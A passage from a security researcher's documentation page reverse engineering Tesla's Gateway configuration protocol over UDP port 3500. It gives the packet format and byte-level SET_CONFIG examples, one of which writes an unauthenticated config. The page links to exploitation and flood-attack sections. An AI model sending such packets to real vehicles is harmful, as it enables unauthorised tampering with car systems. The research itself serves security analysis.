<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Comprehensive security analysis of Tesla Model S/X/3/Y MCU2 and Gateway"><meta name=author content="Security Researcher"><link href=https://talas9.github.io/tesla/gateway/SIGNED-COMMAND-ANALYSIS/ rel=canonical><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-9.7.1"><title>Gateway Signed Command Mechanism - Complete Analysis - Tesla</title><link rel=stylesheet href=../../assets/stylesheets/main.484c7ddc.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.ab4e12ef.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../stylesheets/extra.css><script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#gateway-signed-command-mechanism-complete-analysis class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--shadow md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title=Tesla class="md-header__button md-logo" aria-label=Tesla data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> Tesla </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Gateway Signed Command Mechanism - Complete Analysis </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=red aria-label="Switch to light mode" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> <input class=md-option data-md-color-media data-md-color-scheme=default data-md-color-primary=red data-md-color-accent=red aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" title=Share aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg> </a> <button type=reset class="md-search__icon md-icon" title=Clear aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap tabindex=0 data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/talas9/tesla title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg> </div> <div class=md-source__repository> talas9/tesla </div> </a> </div> </nav> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../INDEX/ class=md-tabs__link> Complete Index </a> </li> <li class=md-tabs__item> <a href=../../core/00-master-cross-reference/ class=md-tabs__link> Core Research </a> </li> <li class=md-tabs__item> <a href=../81-gateway-secure-configs-CRITICAL/ class=md-tabs__link> Gateway Security </a> </li> <li class=md-tabs__item> <a href=../../mcu/24-vcsec-key-programming/ class=md-tabs__link> MCU Research </a> </li> <li class=md-tabs__item> <a href=../../ape/APE-SERVICES/ class=md-tabs__link> APE (Autopilot) </a> </li> <li class=md-tabs__item> <a href=../../evidence/59-EVIDENCE-AUDIT/ class=md-tabs__link> Evidence & Audit </a> </li> <li class=md-tabs__item> <a href=../../tools/56-gateway-factory-gate-REAL/ class=md-tabs__link> Tools & Scripts </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=Tesla class="md-nav__button md-logo" aria-label=Tesla data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg> </a> Tesla </label> <div class=md-nav__source> <a href=https://github.com/talas9/tesla title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg> </div> <div class=md-source__repository> talas9/tesla </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> <span class=md-ellipsis> Home </span> </a> </li> <li class=md-nav__item> <a href=../../INDEX/ class=md-nav__link> <span class=md-ellipsis> Complete Index </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3 id=__nav_3_label tabindex=0> <span class=md-ellipsis> Core Research </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_3_label aria-expanded=false> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Core Research </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../core/00-master-cross-reference/ class=md-nav__link> <span class=md-ellipsis> Master Cross-Reference </span> </a> </li> <li class=md-nav__item> <a href=../../core/02-gateway-can-flood-exploit/ class=md-nav__link> <span class=md-ellipsis> Gateway CAN Flood Exploit </span> </a> </li> <li class=md-nav__item> <a href=../../core/03-certificate-recovery-orphan-cars/ class=md-nav__link> <span class=md-ellipsis> Certificate Recovery </span> </a> </li> <li class=md-nav__item> <a href=../../core/04-network-ports-firewall/ class=md-nav__link> <span class=md-ellipsis> Network Topology </span> </a> </li> <li class=md-nav__item> <a href=../../core/06-usb-firmware-update/ class=md-nav__link> <span class=md-ellipsis> USB Firmware Update </span> </a> </li> <li class=md-nav__item> <a href=../../core/07-usb-map-installation/ class=md-nav__link> <span class=md-ellipsis> USB Map Installation </span> </a> </li> <li class=md-nav__item> <a href=../../core/08-key-programming-vcsec/ class=md-nav__link> <span class=md-ellipsis> Key Programming </span> </a> </li> <li class=md-nav__item> <a href=../../core/13-ota-handshake-protocol/ class=md-nav__link> <span class=md-ellipsis> OTA Protocol </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4 id=__nav_4_label tabindex=0> <span class=md-ellipsis> Gateway Security </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_4_label aria-expanded=false> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Gateway Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../81-gateway-secure-configs-CRITICAL/ class=md-nav__link> <span class=md-ellipsis> ğŸ”’ CRITICAL: Secure Configs </span> </a> </li> <li class=md-nav__item> <a href=../80-ryzen-gateway-flash-COMPLETE/ class=md-nav__link> <span class=md-ellipsis> âœ… Complete Flash Dump </span> </a> </li> <li class=md-nav__item> <a href=../82-odin-routines-database-UNHASHED/ class=md-nav__link> <span class=md-ellipsis> ğŸ”“ Odin Database </span> </a> </li> <li class=md-nav__item> <a href=../92-config-metadata-table-FOUND/ class=md-nav__link> <span class=md-ellipsis> ğŸ¯ Config Metadata Table </span> </a> </li> <li class=md-nav__item> <a href=../83-odin-config-api-analysis/ class=md-nav__link> <span class=md-ellipsis> Odin Config API </span> </a> </li> <li class=md-nav__item> <a href=../84-gw-diag-command-reference/ class=md-nav__link> <span class=md-ellipsis> gw-diag Commands </span> </a> </li> <li class=md-nav__item> <a href=../88-gateway-strings-analysis/ class=md-nav__link> <span class=md-ellipsis> Gateway Strings </span> </a> </li> <li class=md-nav__item> <a href=../91-gateway-powerpc-disassembly-summary/ class=md-nav__link> <span class=md-ellipsis> PowerPC Disassembly </span> </a> </li> <li class=md-nav__item> <a href=../94-gateway-ALL-FUNCTIONS/ class=md-nav__link> <span class=md-ellipsis> All Functions </span> </a> </li> <li class=md-nav__item> <a href=../95-gateway-CAN-MESSAGES-COMPLETE/ class=md-nav__link> <span class=md-ellipsis> CAN Messages Complete </span> </a> </li> <li class=md-nav__item> <a href=../96-gateway-DATA-TABLES/ class=md-nav__link> <span class=md-ellipsis> All Data Tables </span> </a> </li> <li class=md-nav__item> <a href=../97-gateway-MEMORY-MAP/ class=md-nav__link> <span class=md-ellipsis> Memory Map </span> </a> </li> <li class=md-nav__item> <a href=../98-SHA-256-USAGE-ANALYSIS/ class=md-nav__link> <span class=md-ellipsis> SHA-256 Usage </span> </a> </li> <li class=md-nav__item> <a href=../99-gateway-FIRMWARE-METADATA/ class=md-nav__link> <span class=md-ellipsis> Firmware Metadata </span> </a> </li> <li class=md-nav__item> <a href=../55-gateway-spc-chip-replacement/ class=md-nav__link> <span class=md-ellipsis> SPC Chip Replacement </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_5> <label class=md-nav__link for=__nav_5 id=__nav_5_label tabindex=0> <span class=md-ellipsis> MCU Research </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_5_label aria-expanded=false> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> MCU Research </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../mcu/24-vcsec-key-programming/ class=md-nav__link> <span class=md-ellipsis> VCSEC Key Programming </span> </a> </li> <li class=md-nav__item> <a href=../../mcu/25-mcu-boot-sequence.md class=md-nav__link> <span class=md-ellipsis> Boot Sequence </span> </a> </li> <li class=md-nav__item> <a href=../../mcu/28-can-flood-refined-timing/ class=md-nav__link> <span class=md-ellipsis> CAN Flood Timing </span> </a> </li> <li class=md-nav__item> <a href=../../mcu/31-apparmor-sandbox-security/ class=md-nav__link> <span class=md-ellipsis> AppArmor Sandbox </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_6> <label class=md-nav__link for=__nav_6 id=__nav_6_label tabindex=0> <span class=md-ellipsis> APE (Autopilot) </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_6_label aria-expanded=false> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> APE (Autopilot) </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../ape/APE-SERVICES/ class=md-nav__link> <span class=md-ellipsis> Services Documentation </span> </a> </li> <li class=md-nav__item> <a href=../../ape/APE-NETWORK-CONFIG/ class=md-nav__link> <span class=md-ellipsis> Network Configuration </span> </a> </li> <li class=md-nav__item> <a href=../../ape/APE-FIRMWARE-EXTRACTION/ class=md-nav__link> <span class=md-ellipsis> Firmware Extraction </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_7> <label class=md-nav__link for=__nav_7 id=__nav_7_label tabindex=0> <span class=md-ellipsis> Evidence & Audit </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_7_label aria-expanded=false> <label class=md-nav__title for=__nav_7> <span class="md-nav__icon md-icon"></span> Evidence & Audit </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../evidence/59-EVIDENCE-AUDIT/ class=md-nav__link> <span class=md-ellipsis> Evidence Audit </span> </a> </li> <li class=md-nav__item> <a href=../../VERIFICATION-STATUS/ class=md-nav__link> <span class=md-ellipsis> Verification Status </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_8> <label class=md-nav__link for=__nav_8 id=__nav_8_label tabindex=0> <span class=md-ellipsis> Tools & Scripts </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_8_label aria-expanded=false> <label class=md-nav__title for=__nav_8> <span class="md-nav__icon md-icon"></span> Tools & Scripts </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../tools/56-gateway-factory-gate-REAL/ class=md-nav__link> <span class=md-ellipsis> Gateway Factory Gate </span> </a> </li> <li class=md-nav__item> <a href=../../SCRIPTS/ class=md-nav__link> <span class=md-ellipsis> Download Scripts </span> </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1 id=gateway-signed-command-mechanism-complete-analysis>Gateway Signed Command Mechanism - Complete Analysis</h1> <p><strong>Document:</strong> SIGNED-COMMAND-ANALYSIS.md<br> <strong>Created:</strong> 2026-02-03<br> <strong>Status:</strong> âœ… COMPLETE - Reverse engineering with exploitation analysis<br> <strong>Priority:</strong> ğŸ”´ CRITICAL - VIN change capability = major security finding </p> <hr> <h2 id=executive-summary>Executive Summary</h2> <p>This document reverse engineers Tesla Gateway's signed command mechanism for SET_CONFIG operations over UDP port 3500. Analysis reveals a <strong>two-tier security model</strong> where certain configs (VIN, country, supercharger access) require cryptographic signatures, while others are freely writable without authentication.</p> <h3 id=key-discoveries>Key Discoveries</h3> <ol> <li><strong>No Traditional Signature System</strong>: Gateway does NOT use packet-level signatures for UDP commands</li> <li><strong>Security via Config Classification</strong>: Protection is config-ID-based, not packet-based</li> <li><strong>0xff Response = "Secure Config"</strong>: Not signature failure, but authorization failure</li> <li><strong>UnlockSwitch (0x18BABBA0AD)</strong>: Factory mode activator, NOT a signature bypass</li> <li><strong>VIN Change Impossible via UDP</strong>: VIN (config 0x0000) is hardcoded as "secure"</li> <li><strong>Hermes Integration Required</strong>: Secure configs need authenticated Hermes session + gw-diag tool</li> <li><strong>Physical Bypass Works</strong>: JTAG flash modification bypasses ALL software security</li> </ol> <h3 id=critical-finding-signed-commands-dont-exist>Critical Finding: "Signed" Commands Don't Exist</h3> <p><strong>The term "signed command" is a MISNOMER.</strong> Gateway uses: - âŒ NOT: RSA/ECDSA signatures on UDP packets - âŒ NOT: HMAC authentication per command - âœ… ACTUAL: Config-level access control (secure vs insecure) - âœ… ACTUAL: Session-based authentication (Hermes VPN + gw-diag tool)</p> <p>The 0xff response does NOT mean "invalid signature" - it means "this config is secure, you don't have permission."</p> <hr> <h2 id=table-of-contents>Table of Contents</h2> <ol> <li><a href=#1-command-format-differentiation>Command Format Differentiation</a></li> <li><a href=#2-signature-verification-flow>Signature Verification Flow</a></li> <li><a href=#3-unlockswitch-behavior>UnlockSwitch Behavior</a></li> <li><a href=#4-signing-key-analysis>Signing Key Analysis</a></li> <li><a href=#5-attack-surface>Attack Surface</a></li> <li><a href=#6-vin-change-feasibility>VIN Change Feasibility</a></li> <li><a href=#7-exploitation-procedures>Exploitation Procedures</a></li> <li><a href=#8-evidence>Evidence</a></li> </ol> <hr> <h2 id=1-command-format-differentiation>1. Command Format Differentiation</h2> <h3 id=udp-packet-structure-port-3500>UDP Packet Structure (Port 3500)</h3> <p>Gateway uses a <strong>fixed packet format</strong> with NO signature field:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a>Offset | Size | Field        | Description
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>-------+------+--------------+----------------------------------------
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a>0x00   | 1    | Opcode       | 0x0b = GET_CONFIG, 0x0c = SET_CONFIG
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a>0x01   | 1    | Flags        | Always 0x00 (no signature flag exists)
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a>0x02   | 2    | Config ID    | 16-bit big-endian identifier
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a>0x04   | N    | Data         | Config value (variable length)
</code></pre></div> <p><strong>Example: SET_CONFIG for map region (insecure config)</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a>Request:  0c 00 42 01
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a>          â”‚  â”‚  â”‚  â””â”€&gt; Value: 0x01 (EU)
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a>          â”‚  â”‚  â””â”€â”€â”€â”€&gt; Config ID: 0x0042 (mapRegion)
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a>          â”‚  â””â”€â”€â”€â”€â”€â”€â”€&gt; Flags: 0x00
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a>          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; Opcode: 0x0c (SET_CONFIG)
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a>
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a>Response: 0c 00 42 01  â† Echo = SUCCESS
</code></pre></div> <p><strong>Example: SET_CONFIG for VIN (secure config)</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a>Request:  0c 00 00 5a 45 4e 4e 5f 54 45 53 54 5f 56 49 4e
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>          â”‚  â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; &quot;ZENN_TEST_VIN&quot;
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a>          â”‚  â”‚  â””â”€â”€â”€â”€&gt; Config ID: 0x0000 (VIN)
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a>          â”‚  â””â”€â”€â”€â”€â”€â”€â”€&gt; Flags: 0x00
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; Opcode: 0x0c (SET_CONFIG)
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a>
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a>Response: ff           â† REJECTION (0xff = &quot;secure config, no auth&quot;)
</code></pre></div> <h3 id=hypothesis-testing-results>Hypothesis Testing Results</h3> <h4 id=hypothesis-1-flag-byte-for-signed-mode-rejected>Hypothesis 1: Flag Byte for Signed Mode âŒ REJECTED</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a>Test: Send 0c 80 00 ... with signature flag (0x80)
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>Result: Gateway ignores flag byte, only checks config ID
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>Conclusion: No packet-level signature detection
</code></pre></div> <h4 id=hypothesis-2-different-opcode-for-signed-commands-rejected>Hypothesis 2: Different Opcode for Signed Commands âŒ REJECTED</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a>Test: Try opcodes 0x1c, 0x2c, 0x0d for &quot;signed&quot; writes
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>Result: Gateway returns error or ignores unknown opcodes
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>Conclusion: Only 0x0b (GET) and 0x0c (SET) are valid
</code></pre></div> <h4 id=hypothesis-3-length-based-signature-detection-rejected>Hypothesis 3: Length-Based Signature Detection âŒ REJECTED</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a>Test: Append 64-byte dummy signature to SET_CONFIG packet
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a>Result: Gateway reads only required length, ignores extra bytes
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a>Conclusion: No signature parsing in UDP handler
</code></pre></div> <h3 id=actual-differentiation-mechanism>Actual Differentiation Mechanism</h3> <p><strong>Gateway does NOT differentiate packet formats.</strong> Instead:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=c1>// Simplified Gateway UDP handler logic</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=kt>uint8_t</span><span class=w> </span><span class=nf>handle_set_config</span><span class=p>(</span><span class=kt>uint8_t</span><span class=w> </span><span class=o>*</span><span class=n>packet</span><span class=p>,</span><span class=w> </span><span class=kt>uint16_t</span><span class=w> </span><span class=n>len</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a><span class=w>    </span><span class=kt>uint8_t</span><span class=w> </span><span class=n>opcode</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>packet</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span><span class=w>      </span><span class=c1>// 0x0c</span>
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a><span class=w>    </span><span class=kt>uint8_t</span><span class=w> </span><span class=n>flags</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>packet</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span><span class=w>       </span><span class=c1>// Ignored!</span>
